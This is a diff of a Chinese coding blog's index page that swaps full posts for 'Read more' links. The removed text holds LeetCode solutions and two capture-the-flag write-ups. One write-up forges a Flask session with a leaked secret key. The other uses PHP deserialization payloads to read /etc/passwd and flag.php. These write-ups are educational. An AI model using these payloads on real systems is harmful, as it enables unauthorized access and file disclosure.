@@ -244,6 +244,14 @@
 <p>成功通过：</p>
 <p><img src="/2021/12/27/LeetCode-0825-%E9%80%82%E9%BE%84%E7%9A%84%E6%9C%8B%E5%8F%8B/2.png"></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/12/27/LeetCode-0825-%E9%80%82%E9%BE%84%E7%9A%84%E6%9C%8B%E5%8F%8B/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -504,6 +512,14 @@
 <p>结果如下：</p>
 <p><img src="/2021/06/19/LeetCode-1239-%E4%B8%B2%E8%81%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/1.png"></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/19/LeetCode-1239-%E4%B8%B2%E8%81%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -610,16 +626,14 @@
 
 <p><img src="/2021/06/18/LeetCode-0065-%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97/3.png"></p>
 <p>图片来源：<a target="_blank" rel="noopener" href="https://leetcode.com/problems/valid-number/discuss/23728/A-simple-solution-in-Python-based-on-DFA">A simple solution in Python based on DFA</a></p>
-<p>编程部分只要对每个状态进行模拟就可以了，代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Title    : 0065 有效数字</span></span><br><span class="line"><span class="comment"># @Level    : hard</span></span><br><span class="line"><span class="comment"># @Address  : https://leetcode-cn.com/problems/valid-number/</span></span><br><span class="line"><span class="comment"># @Date     : 2021-06-17</span></span><br><span class="line"><span class="comment"># @Author   : lalalashenle</span></span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isNumber</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        <span class="comment"># 状态：</span></span><br><span class="line">        <span class="comment"># 初始空, 符号位, 数字, 小数点, 小数数字, 指数符号e, e后的符号, e后的数字, 结束</span></span><br><span class="line">        state = [</span><br><span class="line">            <span class="comment"># index优化</span></span><br><span class="line">            &#123;&#125;,</span><br><span class="line">            <span class="comment"># state 1</span></span><br><span class="line">            &#123;<span class="string">&quot;blank&quot;</span>: <span class="number">1</span>, <span class="string">&quot;sign&quot;</span>: <span class="number">2</span>, <span class="string">&quot;digit&quot;</span>: <span class="number">3</span>, <span class="string">&quot;dot&quot;</span>: <span class="number">4</span>&#125;,</span><br><span class="line">            <span class="comment"># state 2</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">3</span>, <span class="string">&quot;dot&quot;</span>: <span class="number">4</span>&#125;,</span><br><span class="line">            <span class="comment"># state 3</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">3</span>, <span class="string">&quot;dot&quot;</span>: <span class="number">5</span>, <span class="string">&quot;E&quot;</span>: <span class="number">6</span>, <span class="string">&quot;blank&quot;</span>: <span class="number">9</span>&#125;,</span><br><span class="line">            <span class="comment"># state 4</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">5</span>&#125;,</span><br><span class="line">            <span class="comment"># state 5</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">5</span>, <span class="string">&quot;E&quot;</span>: <span class="number">6</span>, <span class="string">&quot;blank&quot;</span>: <span class="number">9</span>&#125;,</span><br><span class="line">            <span class="comment"># state 6</span></span><br><span class="line">            &#123;<span class="string">&quot;sign&quot;</span>: <span class="number">7</span>, <span class="string">&quot;digit&quot;</span>: <span class="number">8</span>&#125;,</span><br><span class="line">            <span class="comment"># state 7</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">8</span>&#125;,</span><br><span class="line">            <span class="comment"># state 8</span></span><br><span class="line">            &#123;<span class="string">&quot;digit&quot;</span>: <span class="number">8</span>, <span class="string">&quot;blank&quot;</span>: <span class="number">9</span>&#125;,</span><br><span class="line">            <span class="comment"># state 9</span></span><br><span class="line">            &#123;<span class="string">&quot;blank&quot;</span>: <span class="number">9</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 判断字符对应状态</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">stateDicide</span>(<span class="params">s</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= s &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;digit&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> s <span class="keyword">in</span> <span class="string">&#x27;eE&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;E&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> s <span class="keyword">in</span> <span class="string">&quot;+-&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;sign&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> s == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;dot&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> s == <span class="string">&quot; &quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;blank&quot;</span></span><br><span class="line"></span><br><span class="line">        state_index = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ss <span class="keyword">in</span> s:</span><br><span class="line">            ss_state = stateDicide(ss)</span><br><span class="line">            <span class="keyword">if</span> ss_state <span class="keyword">not</span> <span class="keyword">in</span> state[state_index]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            state_index = state[state_index][ss_state]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> state_index <span class="keyword">in</span> &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"></span><br><span class="line">S = Solution()</span><br><span class="line">s = <span class="string">&quot;+6e-1&quot;</span></span><br><span class="line"><span class="built_in">print</span>(S.isNumber(s))</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="/2021/06/18/LeetCode-0065-%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97/2.jpg"></p>
-<p>这道题也可以使用正则表达式解题：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isNumber = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> reg = <span class="regexp">/^[+-]?((\d+(\.\d+)?)|(\d*\.?\d+)|(\d+\.?\d*))(e[+-]?\d+)?$/i</span></span><br><span class="line">    <span class="keyword">return</span> reg.test(s.trim());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/18/LeetCode-0065-%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97/4.jpg"></p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/18/LeetCode-0065-%E6%9C%89%E6%95%88%E6%95%B0%E5%AD%97/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -708,32 +722,14 @@
 <p><img src="/2021/06/16/CTF-HCTF-2018-admin/5.jpg"></p>
 <p>理智告诉我预期解应该不是这样的:) 继续探索探索。</p>
 <p>随便注册了个账号，登陆后右上角多了几个接口：</p>
-<p><img src="/2021/06/16/CTF-HCTF-2018-admin/6.jpg"></p>
-<p>在<code>change password</code>接口中找到了git源码泄露：</p>
-<p><img src="/2021/06/16/CTF-HCTF-2018-admin/7.jpg"></p>
-<p>看来题目用的是flask框架了，代码还挺多的，挑重点的几个讲一下。</p>
-<p>首先看到了仓库中有个templates文件夹，猜想可能是html模板代码。点进去后果然是这样，并且在<code>index.html</code>中发现了本题关键考点：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// https://github.com/woadsl1234/hctf_flask/blob/master/app/templates/index.html</span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，页面显示内容与<code>authenticate</code>以及<code>session[&#39;name&#39;]</code>有关，结合flask框架将session存储在客户端的特性，于是想到了flask-session伪造攻击，之前随手注册了一个名叫<code>111</code>的账号，那么如果能获取到本题session加密的密钥的话，就可以将<code>111</code>账号的<code>session[&#39;name&#39;]</code>更改为<code>admin</code>，从而以<code>admin</code>的身份登录网站。本题源码已经泄露，密钥应该就在仓库中了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-<p>果然，在app文件夹的配置文件中找到了密钥<code>ckj123</code>。</p>
-<p>接下来进行session的伪造工作。</p>
-<p>首先在客户端获取普通账号<code>111</code>的<code>session</code>，得到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kM2KwkAQhF9l6bMHJ9GL4EFJkAg9QZkYui_iT0zSmXEhKpsd8d13cMFbQzVVX9UT9pe-ujUwu_ePagT79gyzJ3wdYQYk2uZlEbMsIlxtO0wW4U4n2tQxua2jslC63Fr0myn5s1C5UdpkA_nMo68nnOxaduk4L8mTFIoNN7mxDg0NZOpfNOuOV-lA0nQsWaQdDbnRLfpd-NEdGWtRMKIIp9qkU5KQb2qFwqLd2nJSRJxQ8K3n8BrB6dZf9vfvrrp-KoR4RdKNyQUEl8ZYFj9sUq9XLAHBayniULMhl3mdLAMeTngxf9u17lBXH6dKlva4-VeuBxcEUErBCB63qn-vBmoMrz_rIGx_.YMmxQw.S01A_oerat0-rIFpwNJpnQbxU_o	</span><br></pre></td></tr></table></figure>
-
-<p>解码<code>session</code>，方法比较简单，首先将<code>session</code>按<code>&#39;.&#39;</code>进行切片，其中第一段就是<code>seesion</code>的用户数据，脚本如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">url = &#x27;你的第一段seesion切片&#x27;</span><br><span class="line">url = base64_decode(url)</span><br><span class="line">url = zlib.decompress(url)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>
-
-<p>输出结果如下：</p>
-<p><img src="/2021/06/16/CTF-HCTF-2018-admin/8.jpg"></p>
-<p>只需要将箭头所指的<code>session[&#39;name&#39;]</code>更改为<code>admin</code>，再将其用<code>secret_key</code>进行加密，就可以完成本轮session伪造攻击了。</p>
-<p>加密session可使用一个<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">开源脚本</a>，部分计算结果如下：</p>
-<p><img src="/2021/06/16/CTF-HCTF-2018-admin/9.jpg"></p>
-<p>利用burpsuite，将重新加密后的session放入报文中，即可得到flag。</p>
-<p><img src="/2021/06/16/CTF-HCTF-2018-admin/10.jpg"></p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/16/CTF-HCTF-2018-admin/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -827,22 +823,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DP(i, j) = piles[i], i == j时</span><br></pre></td></tr></table></figure>
 
 <p>当<code>i</code>大于<code>j</code>时，则</p>
-<ol>
-<li>亚历克斯先手可取位于<code>i</code>处的<code>piles[i]</code>，而李取出剩余<code>(i + 1, j)</code>处的最佳分数，二者之差为亚历克斯的净得分；</li>
-</ol>
-<p>或者：</p>
-<ol start="2">
-<li>亚历克斯先手可取位于<code>j</code>处的<code>piles[j]</code>，而李取出剩余<code>(i, j - 1)</code>处的最佳分数，二者之差为亚历克斯的净得分；</li>
-</ol>
-<p>状态转移方程为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DP(i, j) = MAX(piles[i] - DP(i + 1, j), piles[j] - DP(i, j - 1))</span><br></pre></td></tr></table></figure>
-
-<p>代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Title    : 0877 石子游戏</span></span><br><span class="line"><span class="comment"># @Level    : medium</span></span><br><span class="line"><span class="comment"># @Address  : https://leetcode-cn.com/problems/stone-game/</span></span><br><span class="line"><span class="comment"># @Date     : 2021-06-16</span></span><br><span class="line"><span class="comment"># @Author   : lalalashenle</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stoneGame</span>(<span class="params">self, piles: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        len_p = <span class="built_in">len</span>(piles)</span><br><span class="line">        memo = [[<span class="number">0</span>] * len_p <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, len_p)]</span><br><span class="line">        <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(piles):</span><br><span class="line">            memo[i][i] = p</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, len_p):</span><br><span class="line">                memo[i][j] = <span class="built_in">max</span>(piles[j] - memo[i][j - <span class="number">1</span>], piles[i] - memo[i + <span class="number">1</span>][j])</span><br><span class="line">        <span class="keyword">return</span> memo[<span class="number">0</span>][len_p - <span class="number">1</span>] &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">S = Solution()</span><br><span class="line">piles = [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(S.stoneGame(piles))  <span class="comment"># true</span></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="/2021/06/16/LeetCode-0877-%E7%9F%B3%E5%AD%90%E6%B8%B8%E6%88%8F/2.jpg"></p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/16/LeetCode-0877-%E7%9F%B3%E5%AD%90%E6%B8%B8%E6%88%8F/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -934,28 +922,14 @@
 
 <p>可以看出本题第二个绕过点在于<code>$this-&gt;op === &quot;2&quot;</code>，<code>op</code>参数与<code>&quot;2&quot;</code>的强类型比较绕过，猜想可用int型数字2绕过。</p>
 <p>继续审计代码，跟随<code>__destruct</code>函数的指引跳转到<code>process</code>函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意到<code>$this-&gt;op == &quot;2&quot;</code>，此处比较类型为弱类型比较，上述的int型数字2的绕过方式恰好成立。<code>read</code>函数就是读取<code>filename</code>文件了，故可以通过反序列化设计<code>flag.php</code>文件<code>filename</code>，从而得到flag，先读取<code>/etc/passwd</code>测试一下payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span> = <span class="string">&quot;skwang&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
-
-<p>得到反序列化字符串：</p>
-<p><img src="/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/4.jpg"></p>
-<p>注意到字符串中有不可见字符，这是由于<code>op</code>、<code>filename</code>、<code>content</code>三个参数皆为<code>protected</code>型参数，将字符替换为<code>\00</code>即可。</p>
-<p><img src="/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/5.jpg"></p>
-<p>回显发现绕过失败了。很奇怪，从代码审计看绕过应该是能成功的，int型数字2的绕过方式应该没问题，于是怀疑是反序列化字符串解析失败，因为我们使用了<code>\00</code>这样的16进制编码，极有可能导致反序列化失败或者截断问题。解决方法为：将反序列化字符串中，代表字符串内容的小写s换成大写S，代表后面的字符串用16进制表示。payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;s:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/1.jpg"></p>
-<p>成功读取到了<code>/etc/passwd</code>文件，payload成立。接下来尝试读取<code>flag.php</code>文件，利用filter伪协议，构造相对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>得到反序列化字符串，构造payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/2.jpg"></p>
-<p>成功得到flag！</p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/13/CTF-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AreUSerialz/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1046,30 +1020,14 @@
 <p><img src="/2021/06/11/LeetCode-0279-Perfect-Squares/1.jpg"></p>
 <p>检查一下，对memo数组的循环存在过多冗余，将memo主循环移到第一层，优化后代码如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numSquares</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        memo = [<span class="number">9999999999</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n + <span class="number">1</span>)]</span><br><span class="line">        memo[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">            index = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt;= index ** <span class="number">2</span>:</span><br><span class="line">                memo[i] = <span class="built_in">min</span>(memo[i], memo[i - index ** <span class="number">2</span>] + <span class="number">1</span>)</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br></pre></td></tr></table></figure>
-
-<p>裂开，居然还是超时了。。</p>
-<p><img src="/2021/06/11/LeetCode-0279-Perfect-Squares/3.jpg"></p>
-<p>代码貌似没有什么优化空间了，不由得怀疑是Python太慢了导致的超时问题，换Cpp试试看：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">memo</span><span class="params">(n + <span class="number">1</span>, INT32_MAX)</span></span>;</span><br><span class="line">        memo[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= index * index) &#123;</span><br><span class="line">                memo[i] = <span class="built_in">min</span>(memo[i - index * index] + <span class="number">1</span>, memo[i]);</span><br><span class="line">                index++;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> memo[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/11/LeetCode-0279-Perfect-Squares/4.jpg"></p>
-<p>啊这，动规问题看来还是适合用C++写呀~</p>
-<p>也可以利用<code>BFS</code>算法求解该题，过程类似最短路径。以数字7为例：</p>
